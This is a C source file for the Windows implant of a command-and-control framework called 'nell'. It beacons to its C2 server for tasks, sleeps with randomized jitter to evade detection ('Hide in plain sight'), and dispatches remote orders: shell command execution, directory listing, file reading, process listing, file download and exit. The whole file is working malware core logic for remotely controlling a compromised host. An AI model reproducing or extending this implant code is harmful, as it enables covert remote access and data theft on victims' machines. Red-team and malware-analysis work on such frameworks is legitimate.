#include <windows.h>
#include <stdio.h>
#include "Command.h"
#include "Utils.h"
#include "nell.h"

// Task implementations
#include "tasks/shell.h"
#include "tasks/dir.h"
#include "tasks/exit.h"
#include "tasks/cd.h"
#include "tasks/cat.h"
#include "tasks/ps.h"
#include "tasks/download.h"

BOOL routine()
{
    // Check C2 for any waiting orders
    LOG("[*] routine: Asking for new tasks...");
    PPackage getTask = PackageCreate();
    if (!getTask) return FALSE;

    PackageAddByte(getTask, GET_TASKING);
    PackageAddInt32(getTask, NUMBER_OF_TASKS);

    PParser ResponseParser = sendPackage(getTask);
    PackageDestroy(getTask);

    if (ResponseParser)
    {
        LOG("[+] routine: Received response.");
        commandDispatch(ResponseParser);
        ParserDestroy(ResponseParser);
    }
    else
    {
        LOG("[-] routine: No response or failure.");
    }

    DWORD sleepMs = nellConfig->sleeptime * 1000;
    
    if (nellConfig->jitter > 0)
    {
        DWORD variation = (sleepMs * nellConfig->jitter) / 100;
        if (variation > 0)
        {
            int offset = (rand() % (variation * 2 + 1)) - variation;
            if (offset < 0 && (DWORD)(-offset) > sleepMs) {
                sleepMs = 0;
            } else {
                sleepMs += offset;
            }
        }
    }

    // Hide in plain sight... zzz
    LOG("[*] routine: Sleeping %d ms...", sleepMs);
    Sleep(sleepMs); 

    return TRUE;
}

BOOL commandDispatch(PParser response)
{
    if (!response) return FALSE;

    BYTE typeResponse = ParserGetByte(response);
    LOG("[*] commandDispatch: Response type: 0x%02X", typeResponse);
    
    if (typeResponse == GET_TASKING)
        return handleGetTasking(response); // Got work to do!

    return TRUE;
}

BOOL handleGetTasking(PParser getTasking)
{
    UINT32 numTasks = ParserGetInt32(getTasking);
    LOG("[*] handleGetTasking: numTasks = %d", numTasks);
    
    for (UINT32 i = 0; i < numTasks; i++)
    {
        SIZE_T totalSize = (SIZE_T)ParserGetInt32(getTasking);
        LOG("[*] Task %d size: %llu", i, totalSize);
        
        if (totalSize < 1) continue;
        
        SIZE_T payloadSize = totalSize - 1;

        BYTE taskID = ParserGetByte(getTasking);
        LOG("[*] Task ID: 0x%02X", taskID);
        
        PBYTE taskBuffer = ParserGetBytesRaw(getTasking, payloadSize);
        PParser taskParser = ParserCreate(taskBuffer, payloadSize);
        if (taskBuffer) LocalFree(taskBuffer);

        if (taskID == SHELL_CMD && taskParser) 
        {
            LOG("[*] Executing SHELL_CMD");
            executeShell(taskParser);
        }
        else if (taskID == DIR_LIST && taskParser)
        {
             LOG("[*] Executing DIR_LIST");
             executeDir(taskParser);
        }
        else if (taskID == EXIT_CMD && taskParser)
        {
             LOG("[*] Executing EXIT_CMD");
             executeExit(taskParser);
        }
        else if (taskID == CD_CMD && taskParser)
        {
            LOG("[*] Executing CD_CMD");
            executeCd(taskParser);
        }
        else if (taskID == CAT_CMD && taskParser)
        {
            LOG("[*] Executing CAT_CMD");
            executeCat(taskParser);
        }
        else if (taskID == PS_CMD && taskParser)
        {
            LOG("[*] Executing PS_CMD");
            executePs(taskParser);
        }
        else if (taskID == DOWNLOAD_CMD && taskParser)
        {
            LOG("[*] Executing DOWNLOAD_CMD");
            executeDownload(taskParser);
        }
        else
        {
            LOG("[-] Unknown task or invalid parser");
        }
        
        if (taskParser) ParserDestroy(taskParser);
    }
    return TRUE;
}
